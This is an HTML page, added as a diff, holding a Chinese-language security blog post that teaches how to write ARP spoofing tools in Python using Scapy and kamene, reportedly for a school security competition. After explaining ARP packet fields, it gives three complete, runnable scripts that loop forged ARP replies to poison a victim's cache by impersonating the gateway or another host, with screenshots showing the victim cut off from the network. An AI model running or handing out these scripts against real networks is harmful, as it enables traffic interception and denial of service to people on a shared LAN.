@@ -1,0 +1,203 @@
+<!doctype html>
+<html lang="en">
+    <head><meta name="generator" content="Hexo 3.9.0">
+		
+        <meta http-equiv="Content-Type" content="text/html" charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <meta name="description" content>
+        <meta name="keywords" content>
+        <meta name="HandheldFriendly" content="True">
+        <meta name="MobileOptimized" content="320">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="shortcut icon" href="/img/avatar.jpg">
+        <link rel="alternate" type="application/rss+xml" title="Wiley" href="/atom.xml">
+        <title>编写Python渗透测试工具之ARP欺骗工具 | Wiley的部落格小黑屋</title>
+        <meta name="description" content="{{meta_description}}">
+        <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+        <link rel="stylesheet" type="text/css" href="/styles/crisp.css">
+        <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+        <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+        <![endif]-->
+        <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+    </head>
+    
+		<body class="post-template">
+	
+
+        <header id="header">
+            <a id="logo" href="/"><img src="/img/avatar.jpg" alt="Wiley的部落格小黑屋"></a>
+            <h1 class="center"><a href="/">Wiley</a></h1>
+            <p class="center">信息安全爱好者，未来的CTFer，喜欢写小工具。</p>
+            <span id="follow-icons">
+      <a href="http://github.com/Wileysec"><i class="fa fa-github-square fa-2x"></i></a>
+        <a href="mailto:wileysec@qq.com"><i class="fa fa-envelope-square fa-2x"></i></a>
+            <a href="/atom.xml"><i class="fa fa-rss-square fa-2x"></i></a>
+  </span>
+
+<h6 class="links">
+  <a href="/About">About</a>
+  <a href="/Links">Links</a>
+  <a href="./team.html">Team</a>
+</h6>
+        </header>
+
+        <main id="content">
+        
+
+<article class="post">
+  January 28, 2019
+  
+
+  <h1 class="post-title">编写Python渗透测试工具之ARP欺骗工具</h1>
+  <section class="post-content article-entry">
+    <p>本文章将用Python编写几种ARP欺骗的工具</p>
+<a id="more"></a>
+
+<p>由于我参加了学校的信息安全评估与管理比赛，要求自己学会编写攻击脚本，所以不得不去学习啊。我将记录几种Python ARP攻击工具的写法。</p>
+<p><strong>最最最重要</strong>的是一定要会TCP/IP协议，不然你看ARP协议会懵逼的。</p>
+<p>本文将用Python中的Scapy模块编写。</p>
+<p>用一张图简单介绍一下ARP的攻击原理：</p>
+<p><img src="/uploads/2019/01/3649091532.png" alt="1.png"></p>
+<p>这时候，受害者的流量全部经过攻击者机，卖家发给受害者的流量也会经过攻击者机的手上。从而让受害者无法与网关联系，导致流量无法到达受害者机上。而攻击者却能拿到网段所有流量。</p>
+<p>ARP数据的详细信息列表：</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>注释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Hardware type</td>
+<td>硬件类型，标识链路层协议</td>
+</tr>
+<tr>
+<td>Protocol type</td>
+<td>协议类型，标识网络层协议</td>
+</tr>
+<tr>
+<td>Hardware size</td>
+<td>硬件地址大小，标识MAC地址长度，这里是6个字节(48bit)</td>
+</tr>
+<tr>
+<td>Protocol size</td>
+<td>协议地址大小，标识IP地址长度，这里是4个字节(32bit)</td>
+</tr>
+<tr>
+<td>Opcode</td>
+<td>操作代码，标识ARP数据包类型，1表示请求，2表示回应</td>
+</tr>
+<tr>
+<td>Sender MAC address</td>
+<td>发送者MAC</td>
+</tr>
+<tr>
+<td>Sender IP address</td>
+<td>发送者IP</td>
+</tr>
+<tr>
+<td>Target MAC address</td>
+<td>目标MAC，此处全0表示在请求</td>
+</tr>
+<tr>
+<td>Target IP address</td>
+<td>目标IP</td>
+</tr>
+</tbody></table>
+<h2 id="第一种写法"><a href="#第一种写法" class="headerlink" title="第一种写法"></a>第一种写法</h2><p>这一种写法可以直接调用scapy模块，然后实例化ARP类赋值给arp，然后直接设置源地址和目的地址，如果不设置源Mac地址和目的Mac地址那么默认就是攻击者的Mac地址。</p>
+<p>然后来个死循环不断去发包。</p>
+<p>如果不会ARP，可以看下这个图。</p>
+<p><img src="/uploads/2019/01/763289237.jpg" alt="6.jpg"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arp = ARP()</span><br><span class="line"></span><br><span class="line">arp.psrc = <span class="string">"192.168.1.1"</span></span><br><span class="line"></span><br><span class="line">arp.pdst = <span class="string">"192.168.1.103"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    send(arp)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/uploads/2019/01/3642038485.png" alt="1.png"></p>
+<p>还没攻击之前，网关对应的IP地址是正确的。</p>
+<p><img src="/uploads/2019/01/466338244.png" alt="4.png"></p>
+<p>当我们运行脚本，不断的去发ARP包，不断冲刷ARP缓冲表后</p>
+<p><img src="/uploads/2019/01/2790989868.png" alt="5.png"></p>
+<p><img src="/uploads/2019/01/3233936578.png" alt="2.png"></p>
+<p>网关的IP地址对应的MAC地址发生了变化，网关地址变成了攻击机 Kali Linux的MAC地址。</p>
+<p><img src="/uploads/2019/01/3043806758.png" alt="3.png"></p>
+<p>此时的受害者机已经无法上网了</p>
+<h2 id="第二种写法"><a href="#第二种写法" class="headerlink" title="第二种写法"></a>第二种写法</h2><p>第一种写法，我们是以网关的身份发送ARP包给192.168.1.103这个用户，改掉了MAC地址。</p>
+<p>第二种写法，可以调用kamene模块，这个模块和scapy模块一样，为什么不用scapy模块？请看 <a href="https://www.wileysec.com/archives/559/" title="Python的Scapy模块的一个坑" target="_blank" rel="noopener">Python的Scapy模块的一个坑</a> 这篇文章。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> kamene.all <span class="keyword">import</span> (</span><br><span class="line">    Ether,</span><br><span class="line">    ARP,</span><br><span class="line">    sendp</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">eth = Ether()</span><br><span class="line"></span><br><span class="line">arp = ARP(</span><br><span class="line">    op = <span class="string">'is-at'</span>,</span><br><span class="line"></span><br><span class="line">    hwsrc = <span class="string">"54:27:1E:A2:F4:85"</span>,</span><br><span class="line"></span><br><span class="line">    psrc = <span class="string">"192.168.1.1"</span>,</span><br><span class="line"></span><br><span class="line">    hwdst = <span class="string">"00:0c:29:70:43:e9"</span>,</span><br><span class="line"></span><br><span class="line">    pdst = <span class="string">"192.168.1.106"</span></span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">print((eth / arp).show())</span><br><span class="line"></span><br><span class="line">sendp(eth / arp,inter = <span class="number">2</span>, loop = <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>先调用kamene模块，导入这个模块中的Ether ARP sendp方法。</p>
+<p>然后实例化Ether方法，再实例化ARP方法，并且配置其参数。</p>
+<p>然后重载”/“操作符，可以用来表示两个协议层的组合，显示其数据包的结构信息。</p>
+<p>再使用sendp方法进行发包，每1秒重复发包，这种方法可能会导致本机也上不了网，因为导致了网络拥堵。</p>
+<p><img src="/uploads/2019/01/1731076986.png" alt="6.png"></p>
+<h2 id="第三种方法"><a href="#第三种方法" class="headerlink" title="第三种方法"></a>第三种方法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> (</span><br><span class="line">    ARP,</span><br><span class="line">    Ether,</span><br><span class="line">    sendp</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">eth = Ether()</span><br><span class="line"></span><br><span class="line">arp = ARP(</span><br><span class="line">    op = <span class="string">"is-at"</span>,</span><br><span class="line">    hwsrc = <span class="string">"ff:ff:ff:ff:ff:ff"</span>,</span><br><span class="line">    psrc = <span class="string">"192.168.1.106"</span>,</span><br><span class="line">    pdst = <span class="string">"192.168.1.101"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">print((eth/arp).show())</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    sendp(eth/arp,inter=<span class="number">2</span>,loop=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/uploads/2019/02/3360229114.png" alt="7.png"></p>
+<p>这种方法，我们可以直接以攻击者和客户之间的欺骗，这种方法并没有欺骗用户网关的MAC地址，而是欺骗了我攻击者的MAC地址。</p>
+<p>也就是得出了一个结论，我们既可以通过网关的身份去欺骗用户，也可以通过客户与客户之间的欺骗。如果不写欺骗的MAC地址，那么默认就是攻击者的MAC地址。</p>
+<p>如果有哪里写的不正确，请联系我改正，谢谢~</p>
+
+  </section>
+  <footer class="post-footer">
+    <!--
+    <section class="author">
+      <h4>Wiley</h4>
+      <p></p>
+    </section>
+    -->
+  </footer>
+</article>
+
+<nav class="pagination" role="pagination">
+    
+    <a class="older-posts float-left" href="/posts/e2f1834c.html">
+        &laquo; phpwind后台备份SQL注入漏洞
+    </a>
+    
+    
+    <a class="newer-posts float-right" href="/posts/2f0af854.html">
+        Python的Scapy模块的一个坑 &raquo;
+    </a>
+    
+    <div class="clear-both"></div>
+</nav>
+
+<!-- Table of Contents -->
+<div class="full-toc">
+    <button class="post-toc-menu">TOC</button>
+    <div class="post-toc">
+      <span class="post-toc-title">文章目录</span>
+        <div class="post-toc-content">
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#第一种写法"><span class="toc-text">第一种写法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第二种写法"><span class="toc-text">第二种写法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第三种方法"><span class="toc-text">第三种方法</span></a></li></ol>
+        </div>
+    </div>
+</div>
+
+<script>
+  imglength = $('.post-content p').find('img').length;
+  for(i=0;i<imglength;i++){
+       obj = $(".post-content p img")[i];
+       aobj = $(obj).wrap("<a data-fancybox='gallery' no-pjax='' data-type='image' href='' id='fancybox" + i + "'></a>");
+       imghref = $(aobj).attr('src');
+       $('#fancybox' + i).attr('href',imghref);
+    }
+  $('.post-toc-menu').click(function(){
+    if($('.post-toc').hasClass('open')){
+      $('.post-toc').removeClass('open');
+    }else{
+      $('.post-toc').addClass('open');
+    }
+  });
+</script>
+
+
+        </main>
+        <footer id="footer">
+            <section id="footer-message">&copy; 2019 <a href="https://wileysec.github.io">Wiley</a> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.</section>
+        </footer>
+    </body>
+</html>
+
+
